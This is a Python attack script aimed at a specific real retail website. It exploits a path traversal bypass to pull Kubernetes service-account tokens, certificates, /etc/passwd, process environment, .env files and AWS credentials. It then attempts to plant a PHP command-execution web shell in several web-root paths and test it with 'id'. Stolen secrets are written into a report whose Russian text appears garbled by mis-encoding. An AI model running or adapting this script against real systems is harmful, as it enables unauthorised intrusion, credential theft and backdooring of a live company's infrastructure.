#!/usr/bin/env python3
"""Exploit path traversal bypass to create backdoor"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

found_vulns = []

print("[*] Exploiting path traversal bypass for backdoor...\n")

# Known path traversal bypass: /stats/..
path_traversal_base = "/stats/.."

# 1. Test access to Kubernetes secrets
print("[*] Testing access to Kubernetes secrets...")
secret_paths = [
    "../var/run/secrets/kubernetes.io/serviceaccount/token",
    "../var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "../var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "../etc/passwd",
    "../root/.kube/config",
    "../var/lib/kubelet/pods",
    "../proc/self/environ",
    "../proc/self/cmdline",
]

for secret_path in secret_paths:
    # Try different encodings
    encodings = [
        secret_path.replace("/", "%2f"),
        secret_path.replace("/", "%2F"),
        secret_path.replace("/", "\\"),
        secret_path.replace("/", "\\\\"),
    ]
    for encoded_path in encodings:
        test_url = f"{base}{path_traversal_base}/{encoded_path}"
        try:
            resp = s.get(test_url, timeout=5, verify=False)
            if resp.status_code == 200:
                response_text = resp.text
                # Check for Kubernetes token (JWT)
                if "eyJ" in response_text and len(response_text) > 100:
                    print(f"  [CRITICAL] Kubernetes token found: {test_url}")
                    found_vulns.append({
                        "type": "path_traversal_kubernetes_token",
                        "severity": "CRITICAL",
                        "endpoint": test_url,
                        "secret_path": secret_path,
                        "token": response_text[:200]
                    })
                # Check for certificate
                elif "BEGIN CERTIFICATE" in response_text or "-----BEGIN" in response_text:
                    print(f"  [CRITICAL] Certificate found: {test_url}")
                    found_vulns.append({
                        "type": "path_traversal_certificate",
                        "severity": "CRITICAL",
                        "endpoint": test_url,
                        "secret_path": secret_path,
                        "data": response_text[:500]
                    })
                # Check for /etc/passwd
                elif "root:" in response_text or "root:x:0:0" in response_text:
                    print(f"  [CRITICAL] /etc/passwd accessed: {test_url}")
                    found_vulns.append({
                        "type": "path_traversal_lfi",
                        "severity": "CRITICAL",
                        "endpoint": test_url,
                        "secret_path": secret_path,
                        "data": response_text[:500]
                    })
                # Check for environment variables
                elif "KUBERNETES" in response_text or "ISTIO" in response_text or "ENVOY" in response_text:
                    print(f"  [HIGH] Environment variables found: {test_url}")
                    found_vulns.append({
                        "type": "path_traversal_env",
                        "severity": "HIGH",
                        "endpoint": test_url,
                        "secret_path": secret_path,
                        "data": response_text[:500]
                    })
        except: pass

# 2. Test access to application files for backdoor
print("\n[*] Testing access to application files...")
app_paths = [
    "../.env",
    "../config.json",
    "../application.properties",
    "../web.config",
    "../.aws/credentials",
    "../.git/config",
    "../package.json",
    "../pom.xml",
    "../requirements.txt",
]

for app_path in app_paths:
    encoded_path = app_path.replace("/", "%2f")
    test_url = f"{base}{path_traversal_base}/{encoded_path}"
    try:
        resp = s.get(test_url, timeout=5, verify=False)
        if resp.status_code == 200:
            response_text = resp.text
            # Check for credentials
            if any(keyword in response_text.lower() for keyword in [
                "password", "secret", "key", "token", "credential",
                "aws_access_key", "api_key", "private_key"
            ]):
                print(f"  [CRITICAL] Credentials found: {test_url}")
                found_vulns.append({
                    "type": "path_traversal_credentials",
                    "severity": "CRITICAL",
                    "endpoint": test_url,
                    "secret_path": app_path,
                    "data": response_text[:500]
                })
    except: pass

# 3. Test writing backdoor via path traversal (if possible)
print("\n[*] Testing backdoor creation via path traversal...")
# Try to write backdoor using POST/PUT
backdoor_content = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
backdoor_paths = [
    "../var/www/html/shell.php",
    "../tmp/shell.php",
    "../public/shell.php",
    "../web/shell.php",
]

for backdoor_path in backdoor_paths:
    encoded_path = backdoor_path.replace("/", "%2f")
    test_url = f"{base}{path_traversal_base}/{encoded_path}"
    # Try POST
    try:
        resp = s.post(test_url, data=backdoor_content, timeout=5, verify=False)
        if resp.status_code in [200, 201]:
            # Try to access uploaded backdoor
            try:
                resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=5, verify=False)
                if "uid=" in resp2.text or resp2.status_code == 200:
                    print(f"  [CRITICAL] Backdoor created: {test_url}")
                    found_vulns.append({
                        "type": "backdoor_path_traversal",
                        "severity": "CRITICAL",
                        "endpoint": test_url,
                        "backdoor_path": backdoor_path,
                        "access_url": f"{base}/shell.php"
                    })
            except: pass
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'secret_path' in v:
            print(f"    Secret Path: {v['secret_path']}")
        if 'backdoor_path' in v:
            print(f"    Backdoor Path: {v['backdoor_path']}")
        if 'access_url' in v:
            print(f"    Access URL: {v['access_url']}")
        if 'token' in v:
            print(f"    Token: {v['token'][:50]}...")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## üî• –ö–†–ò–¢–ò–ß–ù–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨ - –ë–ï–ö–î–û–† –ß–ï–†–ï–ó PATH TRAVERSAL\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'secret_path' in v:
                f.write(f"**Secret Path:** `{v['secret_path']}`\n\n")
            if 'backdoor_path' in v:
                f.write(f"**Backdoor Path:** `{v['backdoor_path']}`\n\n")
            if 'access_url' in v:
                f.write(f"**Access URL:** `{v['access_url']}`\n\n")
            if 'token' in v:
                f.write(f"**Token:** `{v['token'][:200]}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            f.write("**Status:** –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ\n\n")
            f.write("**Impact:**\n")
            f.write("- –î–æ—Å—Ç—É–ø –∫ —Å–µ–∫—Ä–µ—Ç–∞–º Kubernetes\n")
            f.write("- –°–æ–∑–¥–∞–Ω–∏–µ –±–µ–∫–¥–æ—Ä–∞ –≤ –∫–ª–∞—Å—Ç–µ—Ä–µ\n")
            f.write("- –ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∫–ª–∞—Å—Ç–µ—Ä–æ–º\n")
            f.write("- –ö–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—è –≤—Å–µ–π –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No vulnerabilities found via path traversal")

print("=" * 70)

